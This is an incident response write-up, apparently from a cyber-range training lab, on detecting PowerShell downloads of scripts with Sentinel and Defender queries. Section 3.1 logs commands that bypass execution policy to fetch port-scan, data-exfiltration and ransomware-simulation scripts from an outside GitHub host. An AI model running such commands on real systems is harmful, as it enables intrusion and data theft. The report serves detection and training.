# 🛡️ Incident Response Report: PowerShell Suspicious Web Request (NIST 800-61 Compliant)

---

## 1. Overview & Explanation
A security alert was generated when **PowerShell** invoked the `Invoke-WebRequest` command to download multiple suspicious scripts from a **GitHub** repository. This tactic is often seen in **post-exploitation** scenarios, where attackers use legitimate system utilities like **PowerShell** to evade defenses and retrieve malicious payloads. By blending in with normal Windows processes, they can deploy backdoors, exfiltrate data, or run malicious scripts with minimal detection.

In this case, logs from **Microsoft Defender for Endpoint (MDE)** and **Microsoft Sentinel** showed four separate script downloads from **windows-target-1**. Further analysis confirmed these scripts had also been **executed** locally. Following NIST 800-61 guidelines, the incident was triaged, contained, eradicated, and lessons learned were documented.

---

## 2. Detection & Alert Rule Creation
### 2.1 Sentinel Alert Configuration
**Alert Name**: “PowerShell Suspicious Web Request”  
**Condition**: Triggers when `Invoke-WebRequest` is used to download files from an external domain.  
**Data Source**: DeviceProcessEvents in MDE, forwarded to Sentinel via **Log Analytics Workspace**.

```kql
// Identify PowerShell commands downloading scripts from external sources
DeviceProcessEvents
| where DeviceName contains "windows-target-1"
| where InitiatingProcessCommandLine contains "invoke-webrequest"
| project TimeGenerated, AccountName, ActionType, DeviceName, FileName, 
         FolderPath, InitiatingProcessCommandLine, SHA256
| order by TimeGenerated desc
```

Result: An incident was automatically created for further investigation.

---

## 3. Incident Analysis
### 3.1 Process Events
Upon investigating the alert, the following commands were identified:

```
"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest 
  -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 
  -OutFile C:\programdata\eicar.ps1
"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest 
  -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 
  -OutFile C:\programdata\exfiltratedata.ps1
"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest 
  -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 
  -OutFile C:\programdata\portscan.ps1
"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest 
  -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 
  -OutFile C:\programdata\pwncrypt.ps1
```

The user later confirmed they had clicked on a link to download free software around the same time the alert was generated, saw a “black screen pop up and then nothing happened,” unaware the scripts had downloaded and executed in the background.

### 3.2 Script Execution Confirmation
A follow-up query revealed the same scripts had also been run locally:

```
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == "windows-target-1"
| where ProcessCommandLine contains "-File" 
      and InitiatingProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, InitiatingProcessCommandLine
| summarize by AccountName, DeviceName, FileName, InitiatingProcessCommandLine
```

### 3.3 Code Review: Using Browserling, the URLs were accessed, and the scripts were analyzed. Each script’s function was verified and categorized.

#### One-Line Descriptions of Each Script:

- **[portscan.ps1](https://github.com/K-ING-TECH/Incident-Response_Invoke-WebRequest/blob/main/portscan.ps1)** - Scans a specified IP range for open common ports and logs the results for network reconnaissance.

- **[eicar.ps1](https://github.com/K-ING-TECH/Incident-Response_Invoke-WebRequest/blob/main/eicar.ps1)** - Creates an EICAR test file to simulate a benign virus detection for testing antivirus software responses.

- **[exfiltratedata.ps1](https://github.com/K-ING-TECH/Incident-Response_Invoke-WebRequest/blob/main/exfiltratedata.ps1)** - Generates fake employee data, compresses it, and uploads it to Azure Blob Storage to simulate data exfiltration.

- **[pwncrypt.ps1](https://github.com/K-ING-TECH/Incident-Response_Invoke-WebRequest/blob/main/pwncrypt.ps1)** - Encrypts files containing sensitive data and leaves a ransom note, simulating ransomware behavior.

Finding: This indicates an active malicious or test scenario, as scripts were successfully invoked on the system.

---

## 4. Containment, Eradication, & Recovery
### 4.1 Containment Actions
Device Isolation

Used Microsoft Defender for Endpoint to isolate the target (windows-target-1), cutting off external attacker communication.
Comprehensive AV Scan

Ran a full antivirus scan to detect and remove potential malware associated with the downloaded scripts.
### 4.2 Eradication Steps
Reimaging & Redeployment

Restored the machine from a known-good backup to ensure all malicious artifacts were removed.

### 4.3 Recovery Measures

#### Security Awareness Training
Enrolled the affected user in KnowBe4 advanced training for phishing and malicious link recognition.

#### Policy Updates
Restricted PowerShell usage to administrative accounts only.

Created a new rule preventing Invoke-WebRequest for non-privileged users.

---

## 5. Post-Incident Activities
#### Lessons Learned
Reinforced user education on suspicious links.

Identified a policy gap allowing unprivileged PowerShell downloads.

#### Policy Enforcement
Implemented new controls restricting remote download commands.

Elevated overall logging and alert thresholds for external script pulls.

#### Incident Closure
Verified all malicious scripts and processes were removed.

Closed the Sentinel incident as “True Positive.”

---

## 6. Conclusion
The detection of PowerShell Invoke-WebRequest commands downloading four malicious scripts triggered a Sentinel alert. Investigation confirmed both the download and execution of the scripts, marking a successful infiltration attempt. Quick device isolation and thorough scanning limited damage. Post-incident actions included reimaging the machine, updating security policies, and enhancing user training to mitigate future threats. By following NIST 800-61 practices, this incident was effectively contained, eradicated, and used as an opportunity to strengthen overall cybersecurity posture.

---

## 7. MITRE ATT&CK TTPs
**T1059.001 (Command & Scripting Interpreter:** PowerShell)	Attacker utilized PowerShell commands (Invoke-WebRequest) to download and execute payloads.

**T1105 (Ingress Tool Transfer):**	Scripts/payloads transferred from an external source (GitHub) onto the target system.

**T1027 (Obfuscated Files or Information):**	Potential script obfuscation, bypass of security policies, and stealthy use of PowerShell.
